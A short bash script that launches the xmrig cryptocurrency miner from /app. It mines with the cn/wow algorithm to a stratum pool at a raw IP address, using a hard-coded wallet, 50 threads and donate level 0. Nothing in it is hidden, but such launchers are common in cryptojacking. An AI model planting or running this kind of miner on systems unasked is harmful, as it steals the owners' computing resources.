#!/bin/bash
cd /app
./xmrig/xmrig \
  -a cn/wow \
  -o stratum+tcp://104.21.18.81:11111 \
  -u Wo4eVYJsXWT8w8sArwpGUKLQib45J5x2nMgEnjSBw9iWCDhXf64KXtV5oNhRwAokNtfUw1AM9ekoi12SAM8R7C3A1GK2UiDvv \
  -p x \
  --threads 50 \
  --cpu-priority 0 \
  --donate-level 0
